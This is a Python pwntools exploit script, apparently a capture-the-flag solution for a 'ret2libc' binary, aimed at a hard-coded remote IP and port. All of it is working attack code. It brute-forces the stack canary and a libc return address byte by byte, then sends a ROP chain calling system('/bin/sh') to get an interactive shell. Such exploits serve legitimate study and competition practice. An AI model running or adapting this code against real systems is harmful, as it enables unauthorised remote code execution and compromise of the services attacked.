#!/usr/bin/python3
from pwn import *
p = process(b"./ret2libc")
libc = ELF('./libc.so.6', checksec=False)
context.arch = 'amd64'
#gdb.attach(p,'''''')
p = remote('188.166.220.129', 10001)

###############
# Leak_canary #
###############

print(hex(libc.symbols['__libc_start_main']))
i=0
p.recvuntil(b">")
canary = b"\x00"
while(1):
    payload = cyclic(0x28) + canary + bytes([i])
    p.send(payload)
    print(payload)
    a = p.recvuntil(b">")
    if (len(a) > 10):
        hi=0
    else :
        print("Not detected")
        canary += bytes([i])
        i = 0
        print(canary)

    if(len(canary) == 8):
        canary =  u64(canary)
        print("[+]Canary:", hex(canary))
        break
    i+=1

#############
# Leak_libc #
#############


libcc = b"\x90"

for i in range(0xf):
    payload = cyclic(0x28) + p64(canary) + p64(0) + libcc + p8((i << 4) + 0xd)
    print(payload)
    p.send(payload)
    if b'Segmentation fault' not in p.recvuntil(b'> '):
        libcc += p8((i << 4) + 0xd)
        break

i=0
while(1):
    payload = cyclic(0x28) + p64(canary) + p64(0) + libcc + bytes([i])
    p.send(payload)
    print(payload)
    a = p.recvuntil(b">")
    if (b"Segmentation fault" in a): 
        i+=1
    else :
        print("Not detected")
        libcc += bytes([i])
        i = 0
        print(libcc)

    if(len(libcc) == 8):
        libc.address =  u64(libcc) - 0x0000000000029d90
        print("[+]Libc_base:", hex(libc.address))
        break

#############
# Get_shell #
#############

pop_rdi = libc.address + 0x000000000002a3e5
ret = libc.address + 0x000000000002a3e6
payload = b'A'*0x28 + p64(canary) + b'B'*0x8 + p64(ret) + p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym['system'])
p.send(payload)
p.interactive()